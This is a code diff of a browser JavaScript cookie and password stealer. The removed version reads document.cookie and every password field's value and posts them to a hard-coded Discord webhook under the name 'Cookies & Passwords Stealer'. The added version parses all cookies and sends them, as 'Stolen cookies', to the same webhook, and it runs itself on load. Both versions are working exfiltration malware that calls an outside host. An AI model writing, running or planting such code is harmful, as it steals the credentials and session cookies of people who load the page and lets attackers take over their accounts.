@@ -1,27 +1,36 @@
-function stealData() {
-  const cookies = document.cookie;
-  const passwords = [];
 
-  for (const input of document.querySelectorAll('input[type="password"]')) {
-    passwords.push(input.value);
-  }
+// Replace this with the Discord webhook
+const webhookUrl = 'https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4';
 
-  /* Construct the payload for the Discord webhook */
-  const payload = {
-    content: 'Cookies: ' + cookies + '\nPasswords:\n- ' + passwords.join('\n- '),
-    username: 'Cookies & Passwords Stealer',
-    avatar_url: 'https://example.com/stalker.png',
-  };
-
-  /* Send the payload to the Discord webhook */
-  fetch('https://discord.com/api/webhooks/1247886011736920064/RYuxpABPWgfqlLaLxe6WPaJ-wrpfO6bxunyN3Bi018wPGftWjXgSt4XIQ5toi04WhZR4', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  }).catch(console.error);
+// Get all the cookies
+function getCookies() {
+    const cookies = document.cookie.split(';');
+    let cookieData = {};
+    for (let cookie of cookies) {
+        const [name, value] = cookie.split('=');
+        cookieData[name.trim()] = value;
+    }
+    return cookieData;
 }
 
-/* Call the stealer function */
-stealData();
+// Send cookie data to Discord webhook
+function sendToDiscord(data) {
+    fetch(webhookUrl, {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    })
+    .then(res => console.log('Success!'))
+    .catch(err => console.error('Error:', err));
+}
+
+// Send cookie data to Discord webhook
+function stealCookies() {
+    const cookieData = getCookies();
+    sendToDiscord({ content: `Stolen cookies:\n\`\`\`${JSON.stringify(cookieData, null, 2)}\`\`\`` });
+}
+
+// Execute the script
+stealCookies();
